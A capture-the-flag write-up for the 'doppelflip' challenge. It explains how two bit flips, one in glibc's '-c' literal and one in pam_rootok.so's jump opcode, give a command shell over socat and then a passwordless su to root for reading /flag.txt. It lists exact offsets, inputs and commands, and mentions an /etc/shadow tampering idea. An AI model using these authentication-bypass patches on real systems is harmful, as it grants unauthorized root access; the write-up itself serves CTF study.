# doppelflip

**Category:** misc · **Points:** 119 · **Solves:** 50 · **Author:** pspaul

## Challenge

> Our container is hardened against cosmic bit flips! Surely there won't be two
> at the same time...

A small C program asks for two `(file, byte offset, bit)` triples, flips one bit
in each, and then starts `socat` on its own stdio. The handout ships the source,
a two-stage Dockerfile (build with `gcc`, runtime is a pinned `ubuntu` digest
with `socat`), `compose.yml` and a placeholder `flag.txt` (`flag{fake}`).

In the image the flag is copied to `/flag.txt` with mode `400` and owner
`root:root`, the helper `/doppelflip` is mode `700 root:root`, and the container
runs as root without a `USER` line:

```dockerfile
COPY --chmod=400 --chown=root:root flag.txt /
COPY --chmod=700 --chown=root:root --from=build /doppelflip /
CMD ["/doppelflip", "/usr/bin/socat", "stdio", "system:echo hello flux"]
```

## TL;DR

The two flips are performed on file descriptors opened **as root**, but the
writes happen *after* the program drops to uid 1000 and *before* it `execve`s
`socat`. So you get two single-bit writes into root-owned programs that are
about to run.

* Flip bit 4 of the `c` in glibc's `"-c"` literal → `"-s"`, so socat's
  `system:echo hello flux` runs `sh -s`, and dash reads its commands from the
  socket (`/flag.txt` is unreadable at uid 1000, but commands run).
* Flip bit 0 of the `je` opcode in `pam_rootok.so` → `jne`, so every non-root
  uid passes `auth sufficient pam_rootok.so`. `su` then short-circuits the auth
  stack and gives root without a password.

## Files

| file | description |
| --- | --- |
| `doppelflip.c` | the 146-line helper: read two bytes as root, flip, drop privileges, write, exec |
| `Dockerfile` | build stage (`gcc`) and runtime stage (`socat`), pinned `ubuntu` digest |
| `compose.yml` | runs the service image |
| `flag.txt` | placeholder `flag{fake}`; the real flag is copied to `/flag.txt` |
| `exploit.py` | the exploit described below |

Tools: `python3` (standard library only).

## Analysis

### What the program does

```c
int fd1, fd2;
unsigned char byte1, byte2;

int prepare_flip(int *fd, unsigned char *byte) {
    char file_path[256];
    long long byte_offset = 0;
    int bit_offset = 0;

    scanf("%255s", file_path);
    scanf("%lld", &byte_offset);
    scanf("%d", &bit_offset);
    if (bit_offset < 0 || bit_offset > 7) return 1;

    *fd = open(file_path, O_RDWR | O_CLOEXEC);
    lseek(*fd, byte_offset, SEEK_SET);
    read(*fd, byte, 1);
    lseek(*fd, -1, SEEK_CUR);
    *byte ^= (1 << bit_offset);
    return 0;
}
```

`main()` calls `prepare_flip()` twice, then drops privileges and only then
writes the modified bytes back:

```c
setgroups(0, NULL);
setresgid(1000, 1000, 1000);
setresuid(1000, 1000, 1000);

printf("Flipping & starting %s\n", executable);
inline_syscall3(SYS_write, fd1, (long)&byte1, 1);
inline_syscall3(SYS_write, fd2, (long)&byte2, 1);
inline_syscall3(SYS_close, fd1, 0, 0);
inline_syscall3(SYS_close, fd2, 0, 0);
inline_syscall3(SYS_execve, (long)executable, (long)args, (long)envp);
```

Every check that matters (`O_RDWR` on a root-only file, `lseek` into it,
`read`) happens while the process is still root, and `lseek(fd, -1, SEEK_CUR)`
re-arms the file position so a single one-byte `write()` after the privilege
drop lands on the byte that was just read. `execve` is called with
`argv = &argv[1]` and an empty environment, so the service is
`/usr/bin/socat stdio system:echo hello flux`.

The program is a one-shot setuid-like primitive: two bits, in two files, as
root, immediately before a program of our choice runs with a socket as stdin
and stdout.

### Flip 1: turn socat's `system:` into a shell that reads the socket

`socat` uses libc's `system()` for the `system:` address. glibc's `do_system()`
assembles `argv = {"sh", "-c", "--", line}` from string literals in libc's
`.rodata`: `"-c"` at file offset `0x1db793`, `"/bin/sh"` at `0x1db799`,
referenced from `do_system()` at `0x5bf67` and `0x5bfb3`.

```
/usr/lib/x86_64-linux-gnu/libc.so.6, byte 1947540 (0x1db794), bit 4
'c' (0x63)  ->  's' (0x73)
```

After the flip `do_system()` starts `sh -s -- "echo hello flux"`. With `-s`,
dash does not execute the string argument — it reads the script from **stdin**,
and socat has wired stdio to the TCP connection. Every line arriving on the
socket is therefore executed as uid 1000:

```
$ id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
```

The flag is `400 root:root`, so this is not enough by itself.

### Flip 2: make `pam_rootok` accept everyone

`/etc/pam.d/su` begins with `auth sufficient pam_rootok.so`, so if
`pam_rootok` returns success, PAM stops there and `su` never asks for a
password. The module's decision is a single `getuid()` test:

```
148f: call getuid@plt
1494: test %eax,%eax
1496: 74 48        je 14e0      ; uid == 0 -> success path
1498: ...                        ; otherwise PAM_AUTH_ERR
```

```
/usr/lib/x86_64-linux-gnu/security/pam_rootok.so, byte 5270 (0x1496), bit 0
0x74 'je'  ->  0x75 'jne'
```

The condition is inverted: any uid that is *not* 0 now jumps to the success
path. Because the entry is `sufficient`, the rest of the auth stack (including
`pam_unix`) is skipped entirely.

### Why the two flips have to be these two

Both files are written by the same still-open descriptors before `execve`, and
both programs are started by that `execve` chain: socat (which uses
`do_system()` from libc) and then `su` (which loads `pam_rootok.so`). Nothing
else has to be patched, and the container is created fresh for every
connection, so the two bits must be enough.

## Solution

### 1. Connect and solve the proof of work

The front end asks for a string that starts with a given prefix and whose
SHA-256 hex digest starts with a given target. `exploit.py` brute-forces
`prefix + str(i)` until the digest matches (seconds for a short target).

### 2. Send the six values, then wait

```
/usr/lib/x86_64-linux-gnu/libc.so.6
1947540
4
/usr/lib/x86_64-linux-gnu/security/pam_rootok.so
5270
0
```

Do **not** pipeline shell commands together with these values.
`prepare_flip()` reads them with `scanf()`, and stdio may have buffered up to
4 KB of the stream — that buffer is discarded when `execve` replaces the
process. Wait until the line

```
Flipping & starting /usr/bin/socat
```

has arrived (the program is unbuffered and prints it right before the two
writes), then send the commands.

### 3. Ask for the flag

```
id
su -c 'id; cat /flag.txt' root
```

Observed:

```
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu)
uid=0(root) gid=0(root) groups=0(root)
flag{the_odds_of_this_happening_due_to_cosmic_rays_are_small_but_not_zero}
```

### 4. Run it

```bash
unzip doppelflip.zip -d doppelflip && cd doppelflip
python3 exploit.py --host <HOST> --port <PORT>
```

`--no-pow` skips the proof of work for a locally built container, which has no
front end in front of it:

```bash
docker build -t doppelflip .
docker run --rm -p 1337:1337 doppelflip &
python3 exploit.py --host 127.0.0.1 --port 1337 --no-pow
```

Do not close the write side of the connection after sending the commands; the
service tears the container down on stdin EOF, before dash gets to run
anything.

## Flag

```
flag{the_odds_of_this_happening_due_to_cosmic_rays_are_small_but_not_zero}
```

## Notes

* The offsets belong to the pinned image digest
  (`ubuntu@sha256:c098726d…`). A container built from a different `ubuntu` tag
  has different glibc and PAM builds; `pam_rootok.so` may still have `74` at
  `0x1496`, but the following displacement and the libc string offsets change.
  Re-derive them with `objdump -d` / `grep -abo` on the image you build.
* `/proc/self/mem` looks tempting (`byte_offset` is a 64-bit `lseek` offset, so
  a bit flip could retarget the second descriptor), but the helper is PIE and a
  read at `0x400000` fails with `Input/output error`; ASLR also re-rolls per
  connection, and only two probes are available.
* Blanking root's password in `/etc/shadow` (byte 5, bit 4: `*` → `:`) does not
  work: `su` still rejects an empty password even with `pam_unix.so nullok`.
  `pam_rootok` avoids password handling altogether.
* The two writes are not atomic with respect to each other: flip 1's write
  happens first, flip 2's second. Both land before `execve`, which is what
  makes the chain work, but anything that relies on the first write changing
  the second write's target does not work (see the `/proc/self/mem` note).
* Files must be openable `O_RDWR` and seekable; the path is read with
  `scanf("%255s")`, so it cannot contain whitespace or a NUL byte.
